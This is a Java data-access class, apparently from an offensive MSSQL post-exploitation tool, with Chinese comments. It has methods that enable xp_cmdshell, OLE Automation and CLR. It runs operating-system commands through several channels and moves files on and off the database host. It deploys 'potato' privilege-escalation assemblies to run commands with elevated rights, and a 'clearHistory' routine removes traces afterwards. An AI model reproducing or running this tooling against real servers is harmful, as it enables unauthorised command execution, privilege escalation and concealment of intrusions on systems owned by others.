package Dao;

import Util.DriverLoader;
import Util.JdbcProfiles;
import Util.MssqlSqlUtil;
import Util.Reporter;
import Util.Utils;

import java.io.File;
import java.sql.*;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Properties;

/**
 * CLI 化解耦（M1）：仅换输出口——Controller/TextArea → Reporter；config.yaml → JdbcProfiles；
 * DriverManager+addURL → DriverLoader。业务逻辑（SQL 模板/CLR 管道/spoa 文件操作）零改动。
 */
public class MssqlDao {
    private String JARFILE;
    private String JDBCURL;
    private String DRIVER;
    private String USERNAME;
    private String PASSWORD;
    private int TIMEOUT;

    private Connection CONN = null;
    private Statement stmt = null;
    private ResultSet rs = null;
    /**
     * 统一输出口（原 MssqlController 日志框；缺省空实现，宿主经 setReporter 注入）
     */
    private Reporter reporter = Reporter.NONE;

    public void setReporter(Reporter reporter) {
        this.reporter = reporter;
    }

    public MssqlDao(String ip,String port,String database,String username,String password,String timeout) throws Exception {
        // 零配置：驱动与 URL 模板取自 JdbcProfiles（原 config.yaml 的 Mssql.* 三项）
        JARFILE = JdbcProfiles.driverPath(JdbcProfiles.MSSQL_JAR);
        JDBCURL = JdbcProfiles.MSSQL_URL;
        DRIVER = JdbcProfiles.MSSQL_CLASS;
        // 进行时间转换
        //timeout = String.valueOf(Integer.parseInt(timeout) * 1000);
        JDBCURL = MessageFormat.format(JDBCURL,ip,port,database,timeout);
        USERNAME = username;
        PASSWORD = password;
        TIMEOUT = Integer.parseInt(timeout);
    }

    /**
     * 连接属性（user/password）
     */
    private Properties connectProps() {
        Properties props = new Properties();
        props.setProperty("user", USERNAME);
        props.setProperty("password", PASSWORD);
        return props;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     * @return
     * @throws java.sql.SQLException
     */
    public void testConnection() throws Exception {
        if (CONN == null || CONN.isClosed()) {
            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
            closeConnection();
        }
    }

    public Connection getConnection() throws Exception {
        if (CONN == null || CONN.isClosed()) {
            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
        }
        return CONN;
    }

    public void closeConnection() throws java.sql.SQLException {
        if (CONN != null) {
            CONN.close();
        }
    }

    /**
     * 统一语句执行函数
     * @param sqlStr sql 语句
     * @param code 编码
     * @return
     * @throws Exception
     */
    public String excute(String sqlStr,String code) throws SQLException {
        StringBuffer res = new StringBuffer();
        if (sqlStr == null || sqlStr.equals("")) {
            return null;
        }
        if("".equals(code)){
            code = "GB2312";
        }
        stmt = CONN.createStatement();
        //stmt.setQueryTimeout(TIMEOUT);
        boolean hasResultSet = stmt.execute(sqlStr);
        if (hasResultSet) {
            rs = stmt.getResultSet();
            java.sql.ResultSetMetaData rsmd = rs.getMetaData();
            int columnCount = rsmd.getColumnCount();
            while (rs.next()) {
                for (int i = 0; i < columnCount; i++) {
                    try {
                        //String temp = new String(rs.getBytes(i + 1),code) + "\n";
                        String temp = new String(rs.getString(i + 1).getBytes(),code) + "\n";
                        res.append(temp);
                    }catch (Exception e){
                        res.append("\n");
                    }
                }
            }
        } else {
            res.append(stmt.getUpdateCount());
        }
        return res.toString();
    }


    /**
     * 激活 xpcmdshell
     */
    public void activateXPCS(){
        try {

            excute(MssqlSqlUtil.activationXPCMDSql,"");
            reporter.log(Utils.log("XP_Cmdshell 激活成功！"));
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * 激活 oap
     */
    public void activateOAP(){
        try {
            excute(MssqlSqlUtil.activationOAPSql,"");
            reporter.log(Utils.log("Ole Automation Procedures 激活成功！"));
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }

    }

    /**
     * xpcmdshell 执行命令
     * @param command
     * @param code
     * @return
     */
    public String runcmdXPCS(String command,String code) {
        String res = "";
        try {
            // 转义单引号
            command = command.replace("'","''");
            String sqlStr = String.format(MssqlSqlUtil.XPCMDSql,command);
            res = excute(sqlStr,code);
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
        return res;
    }

    /**
     * OAP BULK 语句执行回显命令
     * @param command
     * @param filename
     * @param timeout
     * @return
     */
    public String runcmdOAPBULK(String command,String filename,String timeout,String code) {
        String oashellres = null;
        try {
            // 转义单引号
            command = command.replace("'","''");
            // 改用数据文件目录，提高文件写入成功率，目录会存在换行符所以去掉
            String path = excute(MssqlSqlUtil.getPathSql,code).replace("\n","");
            // 为目录添加双引号，有空格的目录需要双引号才能写入
            path = "\"" + path + filename +".txt\"";
            excute(String.format(MssqlSqlUtil.runcmdOAPBULKSql,command,path),"");
            // 判断表是否存在，存在则删除该表
            excute(MssqlSqlUtil.deleteOashellResultSql,"");
            //读取的时候不需要双引号
            excute(String.format(MssqlSqlUtil.getResFromTableSql,timeout,path.replace("\"","")),"");
            oashellres = excute(MssqlSqlUtil.getOaShellResultSql,code);
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);        }
        return oashellres;
    }

    /**
     * OAP COM 组件执行回显命令
     * @param command
     * @return
     * @throws SQLException
     */
    public String runcmdOAPCOM(String command,String code) throws SQLException {
        // 转义单引号
        command = command.replace("'","''");
        String sql = MssqlSqlUtil.runcmdOAPCOMSql;
        String res = excute(String.format(sql,command),code);
        return res;
    }

    /**
     * 利用 JobAgent 特性执行系统命令
     * @param command
     * @return
     */
    public String runcmdagent(String command,String code){
        // 转义单引号
        command = command.replace("'","''");
        String jobname = Utils.getRandomString();
        String res = "";
        String sqlString = MssqlSqlUtil.runcmdAgentSql;
        sqlString = String.format(sqlString.replace("{jobname}",jobname),command);
        try {
            excute(sqlString,code);
            res =  "命令执行成功！该方法没有回显";
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);        }
        return res;
    }

    /**
     * 获取数据库版本
     * @return
     */
    public String getVersion() {
        String res = null;
        try {
            String sqlString = MssqlSqlUtil.versionSql;
            res = excute(sqlString,"");
            res = res.replace("\n","");
            reporter.log(Utils.log("当前数据库版本:\n" + res));
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);
        }
        return res;
    }

    /**
     * 获取当前账号的权限
     * @return
     */
    public void getisdba() {
        String sql = MssqlSqlUtil.isAdminSql;
        String res = "";
        try {
            res = excute(sql,"").replace("\n","");
            if ("1".equals(res)) {
                reporter.log(Utils.log("该账号是 DBA 权限！"));
            } else {
                reporter.log(Utils.log("该账号不是 DBA 权限！"));
            }
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * 清理痕迹
     */
    public boolean clearHistory(){
        try {
            excute(MssqlSqlUtil.closeXPCMDSql,"");
            reporter.log(Utils.log("XP_Cmdshell 关闭成功！"));
            excute(MssqlSqlUtil.closeOapSql,"");
            reporter.log(Utils.log("Ole Automation Procedures 关闭成功！"));
            excute(MssqlSqlUtil.deleteOashellResultSql,"");
            reporter.log(Utils.log("oashellresult 表删除成功！"));
            excute(MssqlSqlUtil.closeCLRSql,"");
            reporter.log(Utils.log("CLR 删除成功！"));
            return true;
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);
        }
        return false;

    }


    /**
     * 设数据库trustworthy为on.
     * 针对程序集 'SqlServerTime' 的 ALTER ASSEMBLY 失败
     * @return
     */
    public boolean setTrustworthy(String database,String status){
        try {
            String sql = MssqlSqlUtil.setTrustworthySql;
            sql = String.format(sql,database,status);
            excute(sql,"");
            reporter.log(Utils.log("设数据库 ["+ database +"] trustworthy 为 on 成功!"));
            return true;
        } catch(Exception e){
            reporter.error(e.getMessage(), e);
        }
        return false;
    }

    /**
     * 激活 CLR
     */
    public boolean activateCLR(){
        try {
            String initsql = MssqlSqlUtil.activationCLRSql;
            excute(initsql,"");
            reporter.log(Utils.log("激活 CLR 成功！正在导入和创建函数请稍等..."));
            return true;
        } catch(Exception e){
            reporter.error(e.getMessage(), e);
        }
        return false;
    }


    /**
     * 初始化 CLR 插件
     */
    public boolean initCLR(){
        try {
            String checksql = MssqlSqlUtil.closeCLRSql;
            excute(checksql,"");
            // 获取插件目录
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mssql" + File.separator + "clr.txt";
            // 读取插件内容
            String contents = Utils.readFile(path).replace("\n","");
            String importsql = String.format(MssqlSqlUtil.CreateAssemblySql,contents);
            excute(importsql,"");
            reporter.log(Utils.log("导入 CLR 程序成功！"));
            return true;
        }catch (Exception e){
            reporter.error(e.getMessage(), e);
        }
        return false;
    }


    /**
     * 检测 CLR 程序是否存在
     */
    public boolean checkCLR(){
        try {
            String checksql1 = MssqlSqlUtil.checkCLRSql;
            //String checksql2 = "if (exists (select * from sys.assemblies where name='MDATKit')) select '1' as res;" ;
            String c1 = excute(checksql1,"");
            //String c2 = excute(checksql2,"");
            if (!c1.equals("-1")){
                reporter.log(Utils.log("CLR 函数存在！"));
                return true;
            }
        }catch (Exception e){
            reporter.error(e.getMessage(), e);        }
        return false;
    }

    /**
     * 创建 CLR 函数
     */
    public boolean createCLRFunc(){
        try {
            String createfunc = MssqlSqlUtil.createCLRFSql;
            excute(createfunc,"");
            reporter.log(Utils.log("创建 CLR 函数成功！"));
            return true;
        }catch (Exception e){
            reporter.error(e.getMessage(), e);
        }
        return false;
    }

    /**
     * CLR 命令执行
     * @param command
     * @param type
     * @param code
     * @return
     */
    public String clrruncmd(String command,String type,String code){
        String res = "";
        command = command.replace("'","''");
        try {
            //普通
            if("0".equals(type)){
                res = excute(String.format(MssqlSqlUtil.cmdSql,command),code);
            }else {//尝试提权
                res = excute(String.format(MssqlSqlUtil.superCmdSql,command),code);
            }
        }catch (Exception e){
            reporter.error(e.getMessage(), e);
        }
        return res;
    }

    ///**
    // * 通过提权执行获取系统管理员密码
    // * @return
    // */
    //public String clrgetadminpassword() throws SQLException {
    //    String res = null;
    //    String sql = MssqlSqlUtil.getSystemPasswordSql;
    //    res = excute(sql,"");
    //    return res;
    //}

    /**
     * sp_OA 组件上传
     * @param path
     * @param contexts
     */
    public void normalUpload(String path,String contexts){
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.normalUploadSql;

        try {
            sql = String.format(sql,"0x" + contexts,path);
            excute(sql,"");
            reporter.log(Utils.log("上传文件成功！"));
            //PublicUtil.log("上传文件成功！");
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * 获取系统全部硬盘，不能用全局 excute 函数
     * @return
     */
    public ArrayList<String> getDisk() {
        String sqlString = MssqlSqlUtil.getDiskSql;
        ArrayList<String> res = new ArrayList<String>();
        try {
            stmt = CONN.createStatement();
            boolean hasResultSet = stmt.execute(sqlString);
            if (hasResultSet) {
                rs = stmt.getResultSet();
                while (rs.next()) {
                    res.add(rs.getString(1));
                }
            } else {
                res.add(String.valueOf(stmt.getUpdateCount()));
            }
            return res;
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);
        }
        return res;
    }

    /**
     * 获取当前目录下的所有文件
     * @param path
     * @return
     */
    public ArrayList<String> getFiles(String path){
        String filesql = String.format(MssqlSqlUtil.getFilesSql,path);
        String selectfile = MssqlSqlUtil.getFilesResSql;
        ArrayList<String> res = new ArrayList<>();
        try {
            excute(filesql,"");
            stmt = CONN.createStatement();
            boolean hasResultSet = stmt.execute(selectfile);
            if (hasResultSet) {
                rs = stmt.getResultSet();
                while (rs.next()) {
                    res.add(rs.getString("isfile")+"|"+rs.getString("subdirectory"));
                }
            }
            return res;
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);        }
        return res;
    }


    /**
     * spoa 下载文件
     * @param path
     * @throws SQLException
     */
    public String normalDownload(String path) throws SQLException {
        String res = "";
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.normalDownloadSql;
        sql = String.format(sql,path);
        try {
            stmt = CONN.createStatement();
            boolean hasResultSet = stmt.execute(sql);
            if (hasResultSet) {
                rs = stmt.getResultSet();
                while (rs.next()) {
                    res = rs.getString("lines");
                }
            }
            return res;
        } catch (SQLException e) {
            reporter.error(e.getMessage(), e);
        }
        return res;

    }

    /**
     * spoa 删除文件
     * @param path
     * @throws SQLException
     */
    public void normaldelete(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.normaldeleteSql;
        sql = String.format(sql,path);

        excute(sql,"");

    }

    /**
     * spoa 新建文件夹
     * @param path
     */
    public void normalmkdir(String path) throws SQLException {
        path = path.replace("'","''").replace("/","\\");
        String sql = String.format(MssqlSqlUtil.normalmkdirSql,path);
        excute(sql,"");
    }

    /**
     * CLR 新建文件夹
     * @param path
     * @throws SQLException
     */
    public void clrmkdir(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = String.format(MssqlSqlUtil.clrmkdirSql,path);
        excute(sql,"");

    }

    /**
     * CLR 删除文件功能
     * @param path
     * @throws SQLException
     */
    public void clrdelete(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.clrdeleteSql;
        sql = String.format(sql,path);
        excute(sql,"");
    }

    /**
     * CLR 上传文件
     * @param path
     * @param contexts
     * @throws SQLException
     */
    public void clrupload(String path,String contexts) throws SQLException {
        path = path.replace("'","''");
        String sql = MssqlSqlUtil.clruploadSql;
        sql = String.format(sql,path,contexts);
        excute(sql,"");
    }

    /**
     * 一键恢复所有组件
     */
    public void recoveryAll() {
        String sqls = MssqlSqlUtil.recoveryAllSql;
        String[] sqlA = sqls.split("\n");
        for (String sql:sqlA) {
           try {
               excute(sql,"");
           }catch (Exception e){
               reporter.log(Utils.log("某组件恢复失败！当前语句："+sql+" - 错误："+ e.toString()));
           }
        }
        reporter.log(Utils.log("所有组件恢复成功！"));
    }




    // ---- 只读状态访问器（CLI dispatcher 结构化 info 用；不影响既有行为） ----

    /**
     * 查询当前账号是否 sysadmin（不落日志，供 info.data.is_dba）
     */
    public boolean queryIsDba() {
        try {
            String res = excute(MssqlSqlUtil.isAdminSql, "").replace("\n", "");
            return "1".equals(res);
        } catch (Exception e) {
            return false;
        }
    }

    public String getConnectionUrl() {
        return JDBCURL;
    }

    // ---- potato 系提权族（M3a Keep 项，D12：仿 createCLRFunc→clrruncmd 管道新写；Extend 1.3.1 对齐） ----

    /** kind → 本地 hex 资产文件名（Plugins/Mssql/<file>，随发布 zip 分发） */
    public static String potatoAsset(String kind) {
        switch (kind) {
            case "badpotato": return "badpotato.txt";
            case "efspotato": return "efspotato.txt";
            case "efspotato_shellcode": return "efspotato_shellcode.txt";
            case "godpotato": return "godpotato.txt";
            case "sweetpotato": return "sweetpotato.txt";
            default: throw new IllegalArgumentException("未知 potato kind: " + kind);
        }
    }

    /** 探测对应 potato 程序集是否已部署（与 checkCLR 同款语义） */
    public boolean checkPotatoFunc(String kind) {
        try {
            String sql;
            switch (kind) {
                case "badpotato": sql = MssqlSqlUtil.checkBadpotatoSql; break;
                case "efspotato": sql = MssqlSqlUtil.checkEfsPotatoSql; break;
                case "efspotato_shellcode": sql = MssqlSqlUtil.checkEfsPotatoSSql; break;
                case "godpotato": sql = MssqlSqlUtil.checkGodPotatoSql; break;
                case "sweetpotato": sql = MssqlSqlUtil.checkSweetPotatoSql; break;
                default: return false;
            }
            String c1 = excute(sql, "");
            return !"-1".equals(c1);
        } catch (Exception e) {
            return false;
        }
    }

    /** 部署：读 hex 资产 → CREATE ASSEMBLY → CREATE PROCEDURE（需 CLR 已启用，调用方先走 kitmain 链） */
    public boolean createPotatoFunc(String kind) {
        try {
            String createAssembly;
            String createProc;
            switch (kind) {
                case "badpotato":
                    createAssembly = MssqlSqlUtil.CreateBadpotatoSql;
                    createProc = MssqlSqlUtil.createBadpotatoFSql;
                    break;
                case "efspotato":
                    createAssembly = MssqlSqlUtil.CreateEfsPotatoSql;
                    createProc = MssqlSqlUtil.createEfsPotatoFSql;
                    break;
                case "efspotato_shellcode":
                    createAssembly = MssqlSqlUtil.CreateEfsPotatoSSql;
                    createProc = MssqlSqlUtil.createEfsPotatoSFSql;
                    break;
                case "godpotato":
                    createAssembly = MssqlSqlUtil.CreateGodPotatoSql;
                    createProc = MssqlSqlUtil.createGodPotatoFSql;
                    break;
                case "sweetpotato":
                    createAssembly = MssqlSqlUtil.CreateSweetPotatoSql;
                    createProc = MssqlSqlUtil.createSweetPotatoFSql;
                    break;
                default:
                    return false;
            }
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mssql"
                    + File.separator + potatoAsset(kind);
            String contents = Utils.readFile(path).replace("\n", "");
            excute(String.format(createAssembly, contents), "");
            excute(createProc, "");
            reporter.log(Utils.log("创建 " + kind + " 函数成功！"));
            return true;
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
            return false;
        }
    }

    /** 执行：exec kitX '<cmd>'（efspotato_shellcode 模板双参，Extend 同款以命令占两槽） */
    public String runPotatoCmd(String kind, String command, String code) {
        String res = "";
        command = command.replace("'", "''");
        try {
            String sql;
            switch (kind) {
                case "badpotato": sql = String.format(MssqlSqlUtil.clrbadpotatoSql, command); break;
                case "efspotato": sql = String.format(MssqlSqlUtil.clrEfsPotatoSql, command); break;
                case "efspotato_shellcode": sql = String.format(MssqlSqlUtil.clrEfsPotatoSSql, command, command); break;
                case "godpotato": sql = String.format(MssqlSqlUtil.clrGodPotatoSql, command); break;
                case "sweetpotato": sql = String.format(MssqlSqlUtil.clrSweetPotatoSql, command); break;
                default: return res;
            }
            res = excute(sql, code);
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
        return res;
    }

    /** 卸载单 kind：drop proc + drop assembly（recovery/clean 用） */
    public boolean closePotatoFunc(String kind) {
        String sql;
        switch (kind) {
            case "badpotato": sql = MssqlSqlUtil.closeBadpotatoSql; break;
            case "efspotato": sql = MssqlSqlUtil.closeEfsPotatoSql; break;
            case "efspotato_shellcode": sql = MssqlSqlUtil.closeEfsPotatoSSql; break;
            case "godpotato": sql = MssqlSqlUtil.closeGodPotatoSql; break;
            case "sweetpotato": sql = MssqlSqlUtil.closeSweetPotatoSql; break;
            default: return false;
        }
        try {
            for (String part : sql.split("\\n")) {
                if (part.trim().isEmpty()) {
                    continue;
                }
                try {
                    excute(part, "");
                } catch (Exception ignore) {
                    // 逐句容错（与 recoveryAll 同风格）
                }
            }
            return true;
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
            return false;
        }
    }

    /** 全部 potato 组件卸载（recovery 扩展） */
    public void closeAllPotato() {
        for (String k : new String[]{"badpotato", "efspotato", "efspotato_shellcode", "godpotato", "sweetpotato"}) {
            closePotatoFunc(k);
        }
        reporter.log(Utils.log("potato 系组件卸载完成"));
    }
}
